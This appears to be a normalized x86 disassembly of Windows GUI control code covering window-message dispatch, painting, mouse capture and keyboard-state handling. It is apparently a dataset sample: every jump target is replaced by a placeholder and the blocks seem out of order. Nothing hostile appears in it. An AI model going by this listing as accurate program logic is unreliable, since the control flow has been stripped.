mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
sub edx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov ebx [ ebp - 0x4 ]
sub eax [ ebx + 0x30 ]
call sub_43b77c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0xc ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebp - 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax - 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_444558
push eax
xor ecx ecx
mov edx 0xb00a
mov eax [ ebp - 0x4 ]
call sub_42df28
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_43130c
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x134 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x180 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x134 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x20 ] eax
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0xffffffff
jne r-xdata
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0xffffffff
jne r-xdata
push ebp
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x180 ]
call sub_43c464
call sub_431234
pop ecx
test al al
jne r-xdata
push ebp
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x134 ]
call sub_43c464
call sub_431234
pop ecx
test al al
jne r-xdata
sub_4313c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434714
mov ebx eax
call GetCapture
cmp ebx eax
jne r-xdata
push 0x0
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
lea edx [ ebp - 0x20 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_43130c
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx + 0x30 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0xa ]
mov edx [ ebp - 0x10 ]
sub eax [ edx + 0x34 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
call sub_444558
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x10 ]
call sub_42df28
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov [ ebp - 0x9 ] 0x1
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
sub_431488
push ebp
mov ebp esp
add esp 0xfffffed4
push ebx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_42d404
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_42e074
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_4313c8
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ ebp - 0x12c ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
call sub_444534
lea edx [ ebp - 0x12c ]
lea ecx [ ebp - 0x124 ]
mov eax [ ebp - 0x14 ]
call sub_42c3e4
lea edx [ ebp - 0x124 ]
xor ecx ecx
mov eax [ ebp - 0x14 ]
call sub_43130c
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_41a7a4
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
dec eax
je r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_42e074
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0xd4 ]
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x44 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x14 ]
call sub_434714
push eax
call DefWindowProcA
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_434714
mov ebx eax
call GetCapture
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x11c ]
push eax
call GetKeyboardState
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x11c ]
call sub_41a6c0
mov [ ebp - 0xc ] al
mov eax [ ebp - 0x18 ]
mov ax [ eax + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov bx 0xffb7
call sub_44c24c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_42df28
jmp r-xdata
sub_4316a8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42e1e4
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x7b
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0xfffffece
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0xbc00
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_42df28
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0xc
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x18 ]
call sub_40e410
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call SetTextColor
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x130 ]
call sub_40f36c
call sub_40e410
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x130 ]
call sub_40f3c0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_42c468
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x13c ]
push eax
call CallWindowProcA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
sub_43180c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_428e90
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
add edx 0xbc00
mov eax [ ebp - 0x10 ]
call sub_42df28
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov [ ebp - 0x9 ] 0x1
sub_431860
push ebp
mov ebp esp
add esp 0xffffffa0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
xor eax eax
push ebp
push sub_4319c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x134 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call BeginPaint
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x134 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xa8 ]
jmp r-xdata
cmp [ ebp - 0x10 ] 0x1
je r-xdata
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
xor ecx ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_431a00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4319c8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call RestoreDC
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xa8 ]
mov eax [ ebp - 0x20 ]
test [ eax + 0x40 ] 0x40
je r-xdata
mov eax [ ebp - 0x20 ]
test [ eax + 0x20 ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call EndPaint
inc [ ebp - 0xc ]
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x20 ]
add eax [ edx + 0x3c ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x20 ]
add eax [ edx + 0x38 ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call ExcludeClipRect
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x1
je r-xdata
mov eax [ ebp - 0x20 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x134 ]
mov edx [ ebp - 0xc ]
call sub_43c464
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
sub_4319cc
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0xf
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov esp ebp
pop ebp
retn
sub_431a00
push ebp
mov ebp esp
add esp 0xffffffc8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x144 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x134 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x148 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x134 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x134 ]
mov edx [ ebp - 0xc ]
call sub_43c504
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x148 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x134 ]
mov edx [ ebp - 0x10 ]
call sub_43c464
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
mov eax [ ebp - 0x28 ]
test [ eax + 0x40 ] 0x10
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x20 ]
add eax [ edx + 0x3c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp - 0x20 ]
add ecx [ eax + 0x38 ]
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x30 ]
call sub_43b7c8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RectVisible
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp - 0x10 ]
call sub_43c464
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x138 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x44 ] 0x80
je r-xdata
mov eax [ ebp - 0x20 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
mov eax 0x80000010
call sub_40e410
push eax
call CreateSolidBrush
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x28 ]
add eax [ edx + 0x3c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x28 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp - 0x28 ]
add ecx [ eax + 0x38 ]
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x34 ]
dec edx
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x30 ]
dec eax
call sub_43b7c8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
mov eax [ ebp - 0x1c ]
push eax
call DeleteObject
mov eax 0x80000014
call sub_40e410
push eax
call CreateSolidBrush
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x28 ]
add eax [ edx + 0x3c ]
inc eax
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x28 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp - 0x28 ]
add ecx [ eax + 0x38 ]
inc ecx
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x30 ]
call sub_43b7c8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
mov eax [ ebp - 0x1c ]
push eax
call DeleteObject
mov eax [ ebp - 0x28 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x8 ]
call sub_42ad40
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x38 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x20 ]
call sub_42df28
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
mov eax [ ebp - 0x20 ]
and [ eax + 0x44 ] 0xff7f
mov eax [ ebp - 0x20 ]
or [ eax + 0x44 ] 0x80
mov eax [ ebp - 0x28 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
sub_431ce4
push ebp
mov ebp esp
add esp 0xffffff88
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x45 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431860
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_430844
test eax eax
jne r-xdata
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x5c ]
push eax
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call BeginPaint
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_42df28
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431ce4
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x5c ]
push eax
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x70 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
call BitBlt
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_431e68
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_431e98
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_431ec8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call sub_40dffc
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_42df28
pop ecx
pop ecx
pop ebp
retn
sub_431ef0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_42df28
pop ecx
pop ecx
pop ebp
retn
sub_431f1c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
xor ecx ecx
mov edx 0xb026
mov eax [ ebp - 0x4 ]
call sub_42df28
pop ecx
pop ecx
pop ebp
retn
sub_431f40
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
xor ecx ecx
mov edx 0xb027
mov eax [ ebp - 0x4 ]
call sub_42df28
pop ecx
pop ecx
pop ebp
retn
sub_431f64
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_431f94
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_431fc4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_431ff4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_432024
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
